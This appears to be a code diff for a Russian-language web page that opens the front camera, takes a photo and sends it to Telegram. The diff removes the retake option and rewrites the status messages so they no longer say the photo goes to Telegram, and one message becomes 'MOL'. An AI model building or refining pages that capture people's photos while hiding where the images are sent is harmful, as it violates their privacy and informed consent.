@@ -105,7 +105,6 @@
   button:hover:not(:disabled) { filter: brightness(1.1); transform: translateY(-1px); }
   button:focus-visible { outline: 3px solid rgb(85 167 255 / 45%); outline-offset: 2px; }
   #btnStart, #btnCapture { background: var(--accent); color: #06111d; }
-  #btnRetake { background: #293545; color: var(--text); }
   #btnSend { background: var(--success); color: #06150f; }
   button:disabled { opacity: 0.45; cursor: not-allowed; }
   #status { margin: 15px 2px 0; color: var(--muted); font-size: 0.9rem; line-height: 1.4; min-height: 22px; }
@@ -133,7 +132,6 @@
     <div class="buttons">
       <button id="btnStart">Разрешить и отправить фото</button>
       <button id="btnCapture" style="display:none;">Сделать снимок</button>
-      <button id="btnRetake" style="display:none;">Переснять</button>
       <button id="btnSend" style="display:none;">Отправить в Telegram</button>
     </div>
 
@@ -153,7 +151,6 @@
 
   const btnStart = document.getElementById('btnStart');
   const btnCapture = document.getElementById('btnCapture');
-  const btnRetake = document.getElementById('btnRetake');
   const btnSend = document.getElementById('btnSend');
   const cameraLabel = document.getElementById('cameraLabel');
 
@@ -205,7 +202,6 @@
         preview.style.display = 'block';
         video.style.display = 'none';
         btnCapture.style.display = 'none';
-        btnRetake.style.display = 'inline-block';
         resolve(blob);
       }, 'image/jpeg', 0.9);
     });
@@ -236,10 +232,10 @@
     try {
       await startCamera();
       await waitForVideo();
-      status.textContent = "Фото сделано. Отправка в Telegram...";
+      status.textContent = "Фото сделано. Завершение...";
       await capturePhoto();
       await sendPhoto();
-      status.textContent = "✅ Фото с передней камеры отправлено в Telegram.";
+      status.textContent = "✅ Фото отправлено.";
     } catch (err) {
       status.textContent = "Не удалось сделать или отправить фото: " + err.message;
       btnStart.disabled = false;
@@ -256,16 +252,6 @@
     }
   });
 
-  btnRetake.addEventListener('click', () => {
-    preview.style.display = 'none';
-    video.style.display = 'block';
-    btnRetake.style.display = 'none';
-    btnSend.style.display = 'none';
-    btnCapture.style.display = 'inline-block';
-    capturedBlob = null;
-    status.textContent = "";
-  });
-
   btnSend.addEventListener('click', async () => {
     if (!capturedBlob) return;
 
@@ -274,7 +260,7 @@
 
     try {
       await sendPhoto();
-      status.textContent = "✅ Фото отправлено в Telegram.";
+      status.textContent = "MOL";
     } catch (err) {
       status.textContent = "Ошибка отправки: " + err.message;
     } finally {
